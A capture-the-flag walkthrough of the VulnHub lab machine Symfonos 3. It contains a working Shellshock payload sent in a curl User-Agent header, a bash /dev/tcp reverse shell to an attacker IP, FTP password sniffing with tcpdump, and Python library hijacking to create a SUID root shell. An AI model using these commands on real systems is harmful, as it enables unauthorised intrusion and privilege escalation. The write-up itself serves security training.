# Table of contents

- [Recon](#recon)
  - [TCP/21 - FTP](#tcp21---ftp)
  - [TCP/80 - HTTP](#tcp80---http)
    - [FFUF](#ffuf)
- [Initial Foothold](#initial-foothold)
  - [TCP/80 - HTTP - Shell Shock](#tcp80---http---shell-shock)
- [Privilege Escalation](#privilege-escalation)
  - [Hades - Via Cronjob + TCPDump](#hades---via-cronjob--tcpdump)
  - [Root - Via Cronjob + Python Hijacking](#root---via-cronjob--python-hijacking)

# Recon

## TCP/21 - FTP
- Anonymous access is disabled

## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/Symfonos-3]
└─# ffuf -u http://$ip/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.12/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________
cgi-bin/.php            [Status: 403, Size: 279, Words: 20, Lines: 10]
cgi-bin/                [Status: 403, Size: 279, Words: 20, Lines: 10]
cgi-bin/.html           [Status: 403, Size: 279, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10]
gate                    [Status: 301, Size: 315, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 241, Words: 24, Lines: 23]
index.html              [Status: 200, Size: 241, Words: 24, Lines: 23]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10]
:: Progress: [18460/18460] :: Job [1/1] :: 8806 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
- `cgi-bin/`
- `gate`
- `index.html`

# Initial Foothold
## TCP/80 - HTTP - Shell Shock 
1. View enumerated directories 
	- `index.html`
		![](images/Pasted%20image%2020220204042119.png)
		- "Can you bust the underworld"
	- `gate`
	![](images/Pasted%20image%2020220204041939.png)
	- `cgi-bin/`
		- Forbidden
2. Fuzz for more directories in `gate/`
	-  `directory-2.3-medium`, found nothing
	-  `common.txt`, found nothing
3. Fuzz for more directories in `cgi-bin/`
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-3]
	└─# ffuf -u http://$ip/cgi-bin/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e '.html,.txt,.cgi,.php'

			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.12/cgi-bin/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
	 :: Extensions       : .html .txt .cgi .php 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________
							[Status: 403, Size: 279, Words: 20, Lines: 10]
	.html                   [Status: 403, Size: 279, Words: 20, Lines: 10]
	.php                    [Status: 403, Size: 279, Words: 20, Lines: 10]
	underworld              [Status: 200, Size: 65, Words: 14, Lines: 2]
	:: Progress: [1102800/1102800] :: Job [1/1] :: 5799 req/sec :: Duration: [0:03:17] :: Errors: 0 ::
	```
	- `underworld`
4. Proceed to `underworld`
	![](images/Pasted%20image%2020220204042429.png)
	- A cgi-bin script is executed, could be vulnerable to Shellshock
5. Determine whether the webserver is susceptible to shellshock
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-3]
	└─# curl -A "() { :;}; echo Content-Type: text/html; echo; /usr/bin/whoami;" http://$ip/cgi-bin/underworld
	cerberus
	```
	- Exploited before @ TryHackMe: 0day
6. Execute reverse shell
	```
	┌──(root💀kali)-[~/vulnHub/Symfonos-3]
	└─# curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.110.4/4444 0>&1' http://$ip/cgi-bin/underworld
	```
	![](images/Pasted%20image%2020220204043454.png)



# Privilege Escalation
## Hades - Via Cronjob + TCPDump
1. Linpeas
	![](images/Pasted%20image%2020220204051708.png)
	1. `hades` running `proftpd`
	2. `cerberus` belongs to the `pcap` group
	3. `tcpdump` is available
2. Look for `proftpd` logs
	```
	cerberus@symfonos3:/var/log/proftpd$ cd /var/log
	cerberus@symfonos3:/var/log$ ls -la
	total 2636
	drwxr-xr-x  8 root        root   4096 Jul 20  2019 .
	drwxr-xr-x 12 root        root   4096 Jul 19  2019 ..
	-rw-r--r--  1 root        root  21941 Apr  6  2020 alternatives.log
	drwxr-x---  2 root        adm    4096 Jul 19  2019 apache2
	drwxr-xr-x  2 root        root   4096 Apr  6  2020 apt
	-rw-r-----  1 root        adm  129794 Feb  3 23:18 auth.log
	-rw-------  1 root        utmp   1536 Feb  3 23:06 btmp
	-rw-r-----  1 root        adm  126990 Feb  3 23:14 daemon.log
	-rw-r-----  1 root        adm  194227 Feb  3 21:36 debug
	-rw-r--r--  1 root        root 439846 Apr  6  2020 dpkg.log
	drwxr-s---  2 Debian-exim adm    4096 Feb  3 22:57 exim4
	-rw-r-----  1 root        adm    6850 Feb  3 23:06 fail2ban.log
	-rw-r--r--  1 root        root  32064 Jul 20  2019 faillog
	drwxr-xr-x  3 root        root   4096 Jul 19  2019 installer
	-rw-r-----  1 root        adm  521046 Feb  3 23:02 kern.log
	-rw-rw-r--  1 root        utmp 292584 Feb  3 22:36 lastlog
	-rw-r-----  1 root        adm  356263 Feb  3 23:02 messages
	drwxr-xr-x  2 root        root   4096 Jul 20  2019 proftpd
	-rw-r-----  1 root        adm  695870 Feb  3 23:18 syslog
	drwxr-x---  2 root        adm    4096 Apr  6  2020 unattended-upgrades
	-rw-r-----  1 root        adm     354 Jul 20  2019 user.log
	-rw-rw-r--  1 root        utmp 110592 Feb  3 23:18 wtmp
	```
	- `proftpd` directory
3. View files in `proftpd`
	```
	cerberus@symfonos3:/var/log$ cd proftpd/
	cerberus@symfonos3:/var/log/proftpd$ ls -la
	total 68
	drwxr-xr-x 2 root root  4096 Jul 20  2019 .
	drwxr-xr-x 8 root root  4096 Jul 20  2019 ..
	-rw-r----- 1 root root     0 Jul 20  2019 controls.log
	-rw-r----- 1 root root 50145 Feb  3 23:18 proftpd.log
	-rw-r--r-- 1 root root  1004 Jul 20  2019 xferlog
	cerberus@symfonos3:/var/log/proftpd$ 
	```
	- only `xferlog` is readable
4. View `xferlog`
	```
	cerberus@symfonos3:/var/log/proftpd$ cat xferlog 
	Sat Jul 20 03:43:47 2019 0 localhost 251 /home/hades/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 03:44:30 2019 0 localhost 251 /home/hades/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 03:49:42 2019 0 localhost 251 /srv/ftp/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 03:58:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 03:59:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 04:00:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 04:01:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 04:02:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 04:03:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 04:04:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	Sat Jul 20 04:06:01 2019 0 localhost 0 /opt/client/statuscheck.txt b _ i r hades ftp 0 * c
	cerberus@symfonos3:/var/log/proftpd$ 
	```
	- Based on the timing, we can tell that `statuscheck.txt` is being generated every minute
	- There is probably a cronjob running as root that is generating `statuscheck.txt`
5. Sniff processes w/ pspy64 to actually see the cronjob being executed
	```
	cerberus@symfonos3:/tmp$ ./pspy64 
	pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


		 ██▓███    ██████  ██▓███ ▓██   ██▓
		▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
		▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
		▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
		▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
		▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
		░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
		░░       ░  ░  ░  ░░       ▒ ▒ ░░  
					   ░           ░ ░     
								   ░ ░     
	...
	2022/02/04 00:40:02 CMD: UID=0    PID=10519  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
	2022/02/04 00:40:02 CMD: UID=0    PID=10520  | /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
	2022/02/04 00:40:02 CMD: UID=0    PID=10521  | cp /bin/bash /tmp/rootbash 
	2022/02/04 00:40:02 CMD: UID=0    PID=10522  | 
	2022/02/04 00:40:02 CMD: UID=0    PID=10523  | /usr/sbin/CRON -f 
	2022/02/04 00:40:02 CMD: UID=105  PID=10524  | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 
	2022/02/04 00:40:02 CMD: UID=1000 PID=10525  | /usr/sbin/exim4 -Mc 1nFsGI-0002jj-38 
	2022/02/04 00:41:01 CMD: UID=0    PID=10526  | /usr/sbin/CRON -f 
	2022/02/04 00:41:01 CMD: UID=0    PID=10527  | /usr/sbin/CRON -f 
	2022/02/04 00:41:01 CMD: UID=0    PID=10528  | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
	2022/02/04 00:41:25 CMD: UID=0    PID=10529  | /bin/sh /sbin/dhclient-script 
	2022/02/04 00:41:25 CMD: UID=0    PID=10530  | run-parts --list /etc/dhcp/dhclient-enter-hooks.d 
	2022/02/04 00:41:25 CMD: UID=0    PID=10531  | /bin/sh /sbin/dhclient-script 
	2022/02/04 00:42:01 CMD: UID=0    PID=10533  | /usr/sbin/CRON -f 
	2022/02/04 00:42:01 CMD: UID=0    PID=10532  | /usr/sbin/cron -f 
	2022/02/04 00:42:01 CMD: UID=0    PID=10534  | /usr/sbin/CRON -f 
	2022/02/04 00:42:01 CMD: UID=0    PID=10535  | /usr/sbin/CRON -f 
	2022/02/04 00:42:01 CMD: UID=0    PID=10537  | /bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt 
	2022/02/04 00:42:01 CMD: UID=0    PID=10536  | /bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
	2022/02/04 00:42:01 CMD: UID=0    PID=10538  | /usr/bin/python2.7 /opt/ftpclient/ftpclient.py 
	2022/02/04 00:42:01 CMD: UID=0    PID=10539  | cp /bin/bash /tmp/rootbash 
	2022/02/04 00:42:01 CMD: UID=0    PID=10540  | sh -c cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash 
	2022/02/04 00:42:01 CMD: UID=0    PID=10541  | /usr/sbin/CRON -f 
	2022/02/04 00:42:01 CMD: UID=105  PID=10542  | /usr/sbin/sendmail -i -FCronDaemon -B8BITMIME -oem root 
	2022/02/04 00:42:01 CMD: UID=1000 PID=10543  | /usr/sbin/exim4 -Mc 1nFsID-0002k1-7a 
	```
	- There are actually 2 cronjobs 
		1. `/bin/sh -c /usr/bin/python2.7 /opt/ftpclient/ftpclient.py` 
			- Executed every 2 minute
			- `ftpclient.py` could be accessing `FTP`, sniffing FTP traffic could reveal passwords
		2. `/bin/sh -c /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt `
			- Executed every minute
1. Sniff FTP traffic w/ `tcpdump`
	```
	# Specify Loopback Interface (127.0.0.1)
	cerberus@symfonos3:/var/log/proftpd$ tcpdump port 21 -i lo 
	```
	![](images/Pasted%20image%2020220204053150.png)
	- hades:PTpZTfU4vxgzvRBE
7. Switch to hades w/ hades:PTpZTfU4vxgzvRBE
	![](images/Pasted%20image%2020220204053828.png)
	

## Root - Via Cronjob + Python Hijacking
1. Linpeas	
	![](images/Pasted%20image%2020220204151325.png)
	1. hades belongs to the `gods` group
	2. `gods` group has write access to the entire python library where python modules resides.
2. Earlier, we used `pspy64` to observe system processes, we saw cronjob executing a python script `ftpclient.py`, since we have write access to the entire `/usr/lib` directory, we can edit the module `ftpclient.py` is using, in order to spawn a root shell.
	- This is called [python hijacking](https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8), TryHackMe: Wonderland also has this
3. View contents of `/opt/ftpclient/ftpclient.py`
	```
	hades@symfonos3:/srv/ftp$ cat /opt/ftpclient/ftpclient.py
	import ftplib

	ftp = ftplib.FTP('127.0.0.1')
	ftp.login(user='hades', passwd='PTpZTfU4vxgzvRBE')

	ftp.cwd('/srv/ftp/')

	def upload():
		filename = '/opt/client/statuscheck.txt'
		ftp.storbinary('STOR '+filename, open(filename, 'rb'))
		ftp.quit()

	upload()
	```
	- `ftplib` module is imported
4. View permissions of `ftplib`
	```
	hades@symfonos3:/srv/ftp$ ls -l /usr/lib/python2.7 | grep ftp
	-rwxrw-r-- 1 root gods  37755 Sep 26  2018 ftplib.py
	-rwxrw-r-- 1 root gods  34438 Jul 19  2019 ftplib.pyc
	hades@symfonos3:/srv/ftp$ 
	```
	- `gods` group have write access
5. Edit `ftplib` to spawn a root shell
	```
	# Make a backup of ftplib.py
	hades@symfonos3:/usr/lib/python2.7$ cp ftplib.py /tmp/ftplib.py.bak
	
	# Create python script to spawn a root shell
	hades@symfonos3:/usr/lib/python2.7$ nano /tmp/ftplib.py # See Screenshot
	
	# Replace malicious python script w/ actual python script
	hades@symfonos3:/tmp$ cp /tmp/ftplib.py /usr/lib/python2.7/ftplib.py
	```
	![](images/Pasted%20image%2020220204153109.png)
6. Wait for cronjob to execute
	```
	hades@symfonos3:/tmp$ ls -l
	total 4988
	-rw-r--r-- 1 hades    hades         76 Feb  4 00:20 ftplib.py
	-rwxr--r-- 1 hades    hades      37755 Feb  4 00:17 ftplib.py.bak
	-rw-r--r-- 1 hades    hades     113360 Feb  3 23:42 hades.out
	-rw-r--r-- 1 cerberus cerberus  113874 Feb  3 22:39 linpeas.out
	-rwxrwxrwx 1 cerberus cerberus  762836 Feb  3 22:38 linpeas.sh
	-rwxr-xr-x 1 cerberus cerberus 3078592 Feb  3 23:33 pspy64
	-rwsr-xr-x 1 root     root      975488 Feb  4 00:24 rootbash # Rootshell
	drwx------ 3 root     root        4096 Feb  3 21:36 systemd-private-32c5effdfe964eecbf53b94cec555765-apache2.service-CbKte3
	drwx------ 3 root     root        4096 Feb  3 21:36 systemd-private-32c5effdfe964eecbf53b94cec555765-systemd-timesyncd.service-8gPZoY
	-rw-r--r-- 1 hades    hades          0 Feb  4 00:18 test
	hades@symfonos3:/tmp$ 
	```
7. Obtain root shell
	```
	hades@symfonos3:/tmp$ /tmp/rootbash -p
	```
	![](images/Pasted%20image%2020220204153849.png)
8. Root Flag
	```
	rootbash-4.2# cd /root
	rootbash-4.2# ls
	proof.txt
	rootbash-4.2# cat proof.txt 

		Congrats on rooting symfonos:3!
											_._
										  _/,__\,
									   __/ _/o'o
									 /  '-.___'/  __
									/__   /\  )__/_))\
		 /_/,   __,____             // '-.____|--'  \\
		e,e / //  /___/|           |/     \/\        \\
		'o /))) : \___\|          /   ,    \/         \\
		 -'  \\__,_/|             \/ /      \          \\
				 \_\|              \/        \          \\
				 | ||              <    '_    \          \\
				 | ||             /    ,| /   /           \\
				 | ||             |   / |    /\            \\
				 | ||              \_/  |   | |             \\
				 | ||_______________,'  |__/  \              \\
				  \|/_______________\___/______\_             \\
				   \________________________     \__           \\        ___
					  \________________________    _\_____      \\ _____/
						 \________________________               \\
			~~~~~~~        /  ~~~~~~~~~~~~~~~~~~~~~~~~~~~  ~~ ~~~~\\~~~~
				~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~    //

		Contact me via Twitter @zayotic to give feedback!

	rootbash-4.2# 
	```
9. View cronjobs
	```
	root@symfonos3:/opt# crontab -l
	@reboot /sbin/dhclient -nw
	* * * * * /usr/bin/curl --silent -I 127.0.0.1 > /opt/ftpclient/statuscheck.txt
	*/2 * * * * /usr/bin/python2.7 /opt/ftpclient/ftpclient.py
	root@symfonos3:/opt# 
	```


---
Tags: #exploit/shell-shock #tcp/80-http/rce #linux-priv-esc/cronjob #linux-priv-esc/python-hijacking 

---
